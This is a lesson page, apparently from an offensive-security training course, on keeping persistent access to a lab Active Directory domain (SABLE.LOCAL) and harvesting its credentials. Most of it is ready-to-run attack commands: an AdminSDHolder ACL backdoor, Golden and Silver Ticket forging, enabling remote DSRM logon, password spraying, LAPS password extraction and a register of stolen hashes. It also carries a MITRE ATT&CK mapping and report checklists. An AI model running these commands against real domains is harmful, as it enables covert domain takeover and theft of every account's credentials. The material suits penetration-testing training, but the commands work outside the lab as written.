---
title: "Phase 4 — Domain Persistence and Credential Harvesting"
tags: [ghost-level, active-directory, persistence, golden-ticket, silver-ticket,
  dcsync, credential-harvesting, module-11-ghost-level]
module: 11-GhostLevel
day: 716
prerequisites:
  - Day 715 — Phase 4: AD Exploitation
  - Day 533 — Post-Exploitation Persistence
related_topics:
  - Day 717 — Phase 5: IoT Target Analysis
---

# Day 716 — Phase 4: Domain Persistence

> "Persistence is not just about staying in. It is about staying
> invisible while you do. The defenders look for new accounts, new
> services, new scheduled tasks. So you use the mechanisms that were
> already there — Kerberos delegation, ACE entries, AdminSDHolder.
> They are harder to spot because they look like normal AD."
>
> — Ghost

---

> **ENGAGEMENT CLOCK — CHECK IN**
> Time elapsed: _______ hours | DA obtained: Y / N | Hashes extracted: Y / N

---

## Goals

Establish durable access to `SABLE.LOCAL` that survives a password reset of
the Administrator account. Collect all high-value credentials from the domain.
Pivot your notes from raw hashes to formatted evidence for the report.
Phase 4 ends here — begin the IoT phase on Day 717.

**Target time:** 2–3 hours.

---

## 1 — Persistence Mechanisms

### 1.1 — AdminSDHolder Backdoor

```bash
# ─── AdminSDHolder ACE backdoor ───────────────────────────────────────
# AdminSDHolder protects privileged accounts by copying its DACL every 60 min.
# Add a GenericAll ACE for our low-priv account → it propagates to all DA accounts.

proxychains python3 /usr/share/doc/python3-impacket/examples/dacledit.py \
    "SABLE.LOCAL/Administrator:<password>" \
    -action write -rights FullControl \
    -principal sable_app \
    -target "AdminSDHolder" \
    -dc-ip 10.0.1.30

# After ≤ 60 min (or trigger manually via SDProp):
# sable_app will have GenericAll on: Administrator, krbtgt, Domain Admins, etc.
```

### 1.2 — Golden Ticket (krbtgt Hash)

```bash
# Already forged on Day 715. Document ingredients clearly for the report.

# ─── Verify the Golden Ticket still works ────────────────────────────
export KRB5CCNAME=Administrator.ccache
proxychains python3 /usr/share/doc/python3-impacket/examples/smbclient.py \
    -k -no-pass \
    SABLE.LOCAL/Administrator@10.0.1.30 \
    -c "ls C:\\Users\\"
```

### 1.3 — Silver Ticket (Service Account Hash)

```bash
# Silver Ticket: forge a TGS for a specific service without touching the DC.
# Harder to detect (no KDC log entry), but scoped to one service.

# Create Silver Ticket for CIFS on sable-dc:
proxychains python3 /usr/share/doc/python3-impacket/examples/ticketer.py \
    -nthash <sable_dc_machine_hash> \
    -domain-sid <domain_SID> \
    -domain SABLE.LOCAL \
    -spn CIFS/sable-dc.SABLE.LOCAL \
    -duration 3650 \
    Administrator

export KRB5CCNAME=Administrator.ccache
proxychains smbclient -k //sable-dc.SABLE.LOCAL/C$ 2>/dev/null
```

### 1.4 — DSRM Account

```bash
# The DSRM (Directory Services Restore Mode) local admin password is set on
# every DC at domain promotion and rarely changed.

# Check if DSRM account can log in remotely (registry key required):
proxychains python3 /usr/share/doc/python3-impacket/examples/reg.py \
    "SABLE.LOCAL/Administrator:<password>" \
    -dc-ip 10.0.1.30 \
    query -keyName \
    "HKLM\\System\\CurrentControlSet\\Control\\Lsa" \
    -v DsrmAdminLogonBehavior

# Enable remote DSRM login (value 2):
proxychains python3 /usr/share/doc/python3-impacket/examples/reg.py \
    "SABLE.LOCAL/Administrator:<password>" \
    -dc-ip 10.0.1.30 \
    add -keyName \
    "HKLM\\System\\CurrentControlSet\\Control\\Lsa" \
    -v DsrmAdminLogonBehavior -vt REG_DWORD -vd 2

# ─── Dump the DSRM hash ───────────────────────────────────────────────
grep "SABLE-DC\\\\" recon/dc_local_hashes.txt | head -5
```

```
PERSISTENCE MECHANISMS DEPLOYED

AdminSDHolder backdoor: Y / N
  Account granted GenericAll: _________________________________
  Will propagate to: Administrator, krbtgt, DA group

Golden Ticket:
  krbtgt NT hash: ______________________________________________
  Domain SID: _________________________________________________
  Valid for: _______ years
  File: Administrator.ccache

Silver Ticket (CIFS): Y / N
  Service account hash: ________________________________________

DSRM hash obtained: Y / N
  NT hash: ____________________________________________________

Time to reset to full access if all passwords changed: ________
```

---

## 2 — Domain-Wide Credential Collection

```bash
# ─── All user hashes (already done via DCSync) ───────────────────────
wc -l recon/dcsync_hashes.txt

# ─── Password spray with recovered passwords ─────────────────────────
# Test each cracked password against all domain users
proxychains crackmapexec smb 10.0.1.30 \
    -u recon/ad_users_list.txt \
    -p recon/cracked_passwords.txt \
    -d SABLE.LOCAL \
    --continue-on-success 2>/dev/null | grep "[+]"

# ─── LAPS passwords (if LAPS deployed) ───────────────────────────────
proxychains ldapsearch -x -h 10.0.1.30 \
    -D "CN=Administrator,CN=Users,DC=SABLE,DC=LOCAL" \
    -w "<password>" \
    -b "DC=SABLE,DC=LOCAL" \
    "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd sAMAccountName

# ─── Find accounts with Kerberos constrained/unconstrained delegation ─
proxychains ldapsearch -x -h 10.0.1.30 \
    -D "CN=sable_app,CN=Users,DC=SABLE,DC=LOCAL" \
    -w "<password>" \
    -b "DC=SABLE,DC=LOCAL" \
    "(msDS-AllowedToDelegateTo=*)" sAMAccountName msDS-AllowedToDelegateTo
```

```
CREDENTIAL HARVEST — FINAL COUNT

Domain account hashes extracted: _______  (via DCSync)
Cleartext passwords obtained: _______
  Source: memory / GPP / LAPS / script / description

Highest-privileged account cracked: ___________________________
Password reuse across systems: Y / N
  Accounts: ___________________________________________________

LAPS deployed: Y / N  (if Y: local admin passwords randomised per host)
```

---

## 3 — Phase 4 Evidence Package

```bash
# ─── Organise all Phase 4 evidence before moving on ──────────────────
mkdir -p recon/phase4-evidence

# Move key outputs
cp recon/bloodhound/*.zip      recon/phase4-evidence/
cp recon/dcsync_hashes.txt     recon/phase4-evidence/
cp recon/kerberoast_hashes.txt recon/phase4-evidence/
cp recon/asrep_hashes.txt      recon/phase4-evidence/
cp Administrator.ccache        recon/phase4-evidence/

# ─── Create a Phase 4 credential register ─────────────────────────────
cat > recon/phase4-evidence/creds_register.txt << 'EOF'
# Phase 4 Credential Register
# Format: TYPE | ACCOUNT | VALUE | SOURCE

[hash]   Administrator   SABLE.LOCAL   <NT_hash>   DCSync
[hash]   krbtgt          SABLE.LOCAL   <NT_hash>   DCSync
[pass]   <kerberoast_user>  SABLE.LOCAL  <password>  Kerberoast+crack
[pass]   sable_app       SABLE.LOCAL  <password>   sable-web .env
[ticket] Administrator   Golden Ticket   Administrator.ccache

EOF

echo "Phase 4 evidence packaged."
ls -lh recon/phase4-evidence/
```

```
PHASE 4 COMPLETION CHECK

[ ] Tunnel established and stable to sable-dc
[ ] BloodHound collection loaded
[ ] Kerberoasting performed (hashes saved)
[ ] AS-REP roasting performed (hashes saved)
[ ] Domain Admin privileges obtained
[ ] DCSync executed (all hashes extracted)
[ ] krbtgt hash saved — Golden Ticket forged
[ ] Persistence mechanism deployed (AdminSDHolder / Golden Ticket)
[ ] Evidence package in recon/phase4-evidence/

Time on Phase 4: _______ hours  (target: ≤ 6 total for Phase 4)

Next: Phase 5 — IoT target (sable-iot 10.0.1.40)
```

---

## 4 — ATT&CK Coverage Log — Phase 4

```
MITRE ATT&CK — PHASE 4 TECHNIQUES

T1558.003  Steal or Forge Kerberos Tickets — Kerberoasting
T1558.004  Steal or Forge Kerberos Tickets — AS-REP Roasting
T1003.006  OS Credential Dumping — DCSync
T1550.002  Use Alternate Authentication Material — Pass-the-Hash
T1550.003  Use Alternate Authentication Material — Pass-the-Ticket
T1484.001  Domain Policy Modification — Group Policy
T1098.001  Account Manipulation — Add to Domain Admin
T1136.002  Create Account — Domain Account (if used)
T1069.002  Permission Groups Discovery — Domain Groups
T1018     Remote System Discovery
T1135     Network Share Discovery (SYSVOL/NETLOGON)

Confirmed used (check each): ______________________________________
```

---

## Navigation

← Previous: [Day 715 — Phase 4: AD Exploitation](DAY-0715-Phase4-AD-Exploitation.md)
→ Next: [Day 717 — Phase 5: IoT Target Analysis](DAY-0717-Phase5-IoT-Analysis.md)
